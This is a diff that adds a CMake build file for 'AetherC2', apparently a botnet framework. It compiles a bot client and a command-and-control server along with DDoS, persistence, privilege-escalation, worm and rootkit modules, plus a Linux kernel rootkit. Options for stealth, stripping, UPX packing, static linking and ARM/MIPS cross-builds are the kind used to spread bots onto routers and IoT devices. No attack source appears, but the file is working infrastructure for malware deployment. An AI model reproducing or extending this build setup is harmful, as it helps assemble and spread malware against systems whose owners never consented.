@@ -1,0 +1,221 @@
+cmake_minimum_required(VERSION 3.16)
+project(AetherC2 VERSION 1.0.0 LANGUAGES CXX C)
+
+# Set C++ standard
+set(CMAKE_CXX_STANDARD 17)
+set(CMAKE_CXX_STANDARD_REQUIRED ON)
+set(CMAKE_C_STANDARD 11)
+set(CMAKE_C_STANDARD_REQUIRED ON)
+
+# Compiler flags for optimization and stealth
+set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -O3 -fPIC -fvisibility=hidden")
+set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -O3 -fPIC -fvisibility=hidden")
+
+# Debug flags (conditional)
+if(CMAKE_BUILD_TYPE STREQUAL "Debug")
+    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -g -DDEBUG")
+    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -g -DDEBUG")
+else()
+    # Release optimizations
+    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -DNDEBUG -s")
+    set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -DNDEBUG -s")
+endif()
+
+# Find required packages
+find_package(PkgConfig REQUIRED)
+find_package(Threads REQUIRED)
+
+# OpenSSL
+find_package(OpenSSL REQUIRED)
+if(OPENSSL_FOUND)
+    message(STATUS "OpenSSL found: ${OPENSSL_VERSION}")
+    include_directories(${OPENSSL_INCLUDE_DIR})
+else()
+    message(FATAL_ERROR "OpenSSL not found")
+endif()
+
+# SQLite3
+pkg_check_modules(SQLITE3 REQUIRED sqlite3)
+
+# Include directories
+include_directories(${CMAKE_SOURCE_DIR}/include)
+include_directories(${CMAKE_SOURCE_DIR}/src)
+
+# Source files
+set(COMMON_SOURCES
+    src/protocol.hpp
+)
+
+set(BOT_SOURCES
+    src/bot_client_fixed.cpp
+    src/bot_client.hpp
+    ${COMMON_SOURCES}
+)
+
+set(C2_SOURCES
+    src/c2_server_complete.cpp
+    src/c2_server_fixed.hpp
+    ${COMMON_SOURCES}
+)
+
+# Module sources
+set(DDOS_MODULE_SOURCES src/ddos_fixed.cpp)
+set(PERSISTENCE_MODULE_SOURCES src/persistence.cpp)
+set(PRIVESC_MODULE_SOURCES src/privesc.cpp)
+set(WORM_MODULE_SOURCES src/worm.cpp)
+set(ROOTKIT_MODULE_SOURCES src/rootkit.cpp)
+
+# Bot executable
+add_executable(bot.v4 src/bot_main_fixed.cpp ${BOT_SOURCES})
+target_link_libraries(bot.v4 
+    ${OPENSSL_LIBRARIES} 
+    ${CMAKE_DL_LIBS}
+    Threads::Threads
+)
+
+# C2 Server executable
+add_executable(c2.v4 src/c2_main.cpp ${C2_SOURCES})
+target_link_libraries(c2.v4 
+    ${OPENSSL_LIBRARIES} 
+    ${SQLITE3_LIBRARIES}
+    Threads::Threads
+)
+
+# Modules (shared libraries)
+add_library(ddos_module SHARED ${DDOS_MODULE_SOURCES})
+set_target_properties(ddos_module PROPERTIES 
+    OUTPUT_NAME "ddos"
+    PREFIX ""
+    SUFFIX ".so"
+)
+
+add_library(persistence_module SHARED ${PERSISTENCE_MODULE_SOURCES})
+set_target_properties(persistence_module PROPERTIES 
+    OUTPUT_NAME "persistence"
+    PREFIX ""
+    SUFFIX ".so"
+)
+
+add_library(privesc_module SHARED ${PRIVESC_MODULE_SOURCES})
+set_target_properties(privesc_module PROPERTIES 
+    OUTPUT_NAME "privesc"
+    PREFIX ""
+    SUFFIX ".so"
+)
+
+add_library(worm_module SHARED ${WORM_MODULE_SOURCES})
+set_target_properties(worm_module PROPERTIES 
+    OUTPUT_NAME "worm"
+    PREFIX ""
+    SUFFIX ".so"
+)
+
+add_library(rootkit_module SHARED ${ROOTKIT_MODULE_SOURCES})
+set_target_properties(rootkit_module PROPERTIES 
+    OUTPUT_NAME "rootkit"
+    PREFIX ""
+    SUFFIX ".so"
+)
+
+# Kernel module (if building on Linux)
+if(UNIX AND NOT APPLE)
+    # Find kernel headers
+    execute_process(
+        COMMAND uname -r
+        OUTPUT_VARIABLE KERNEL_VERSION
+        OUTPUT_STRIP_TRAILING_WHITESPACE
+    )
+    
+    set(KERNEL_DIR "/lib/modules/${KERNEL_VERSION}/build")
+    
+    if(EXISTS ${KERNEL_DIR})
+        # Custom target for kernel module
+        add_custom_target(rootkit_kernel ALL
+            COMMAND make -C ${KERNEL_DIR} M=${CMAKE_CURRENT_SOURCE_DIR}/src modules
+            WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}
+            COMMENT "Building kernel module"
+        )
+        
+        add_custom_command(TARGET rootkit_kernel POST_BUILD
+            COMMAND ${CMAKE_COMMAND} -E copy 
+            ${CMAKE_CURRENT_SOURCE_DIR}/src/rootkit.ko 
+            ${CMAKE_CURRENT_BINARY_DIR}/rootkit.ko
+        )
+    endif()
+endif()
+
+# Installation rules
+install(TARGETS bot.v4 c2.v4 DESTINATION bin)
+install(FILES 
+    ${CMAKE_CURRENT_BINARY_DIR}/ddos.so
+    ${CMAKE_CURRENT_BINARY_DIR}/persistence.so
+    ${CMAKE_CURRENT_BINARY_DIR}/privesc.so
+    ${CMAKE_CURRENT_BINARY_DIR}/worm.so
+    ${CMAKE_CURRENT_BINARY_DIR}/rootkit.so
+    DESTINATION lib/modules
+)
+
+# Pack targets for deployment
+set(CPACK_GENERATOR "TGZ")
+set(CPACK_PACKAGE_NAME "aether-c2")
+set(CPACK_PACKAGE_VERSION "1.0.0")
+include(CPack)
+
+# Custom targets for cross-compilation
+if(CROSS_COMPILE_ARM)
+    set(CMAKE_SYSTEM_NAME Linux)
+    set(CMAKE_SYSTEM_PROCESSOR arm)
+    set(CMAKE_C_COMPILER arm-linux-gnueabihf-gcc)
+    set(CMAKE_CXX_COMPILER arm-linux-gnueabihf-g++)
+    
+    add_executable(bot.v4.arm src/bot_main_fixed.cpp ${BOT_SOURCES})
+    target_link_libraries(bot.v4.arm 
+        ${OPENSSL_LIBRARIES} 
+        ${CMAKE_DL_LIBS}
+        Threads::Threads
+    )
+endif()
+
+if(CROSS_COMPILE_MIPS)
+    set(CMAKE_SYSTEM_NAME Linux)
+    set(CMAKE_SYSTEM_PROCESSOR mips)
+    set(CMAKE_C_COMPILER mips-linux-gnu-gcc)
+    set(CMAKE_CXX_COMPILER mips-linux-gnu-g++)
+    
+    add_executable(bot.v4.mips src/bot_main_fixed.cpp ${BOT_SOURCES})
+    target_link_libraries(bot.v4.mips 
+        ${OPENSSL_LIBRARIES} 
+        ${CMAKE_DL_LIBS}
+        Threads::Threads
+    )
+endif()
+
+# Static linking for deployment
+option(STATIC_LINKING "Enable static linking" OFF)
+if(STATIC_LINKING)
+    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
+    set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")
+endif()
+
+# Strip symbols in release mode
+if(CMAKE_BUILD_TYPE STREQUAL "Release")
+    add_custom_command(TARGET bot.v4 POST_BUILD
+        COMMAND ${CMAKE_STRIP} $<TARGET_FILE:bot.v4>)
+    add_custom_command(TARGET c2.v4 POST_BUILD
+        COMMAND ${CMAKE_STRIP} $<TARGET_FILE:c2.v4>)
+endif()
+
+# UPX packing (if available)
+find_program(UPX_EXECUTABLE upx)
+if(UPX_EXECUTABLE)
+    add_custom_target(pack
+        COMMAND ${UPX_EXECUTABLE} --best $<TARGET_FILE:bot.v4>
+        DEPENDS bot.v4
+        COMMENT "Packing executable with UPX"
+    )
+endif()
+
+message(STATUS "Build configuration complete")
+message(STATUS "Bot executable: bot.v4")
+message(STATUS "C2 executable: c2.v4")
+message(STATUS "Modules: ddos.so, persistence.so, privesc.so, worm.so, rootkit.so")
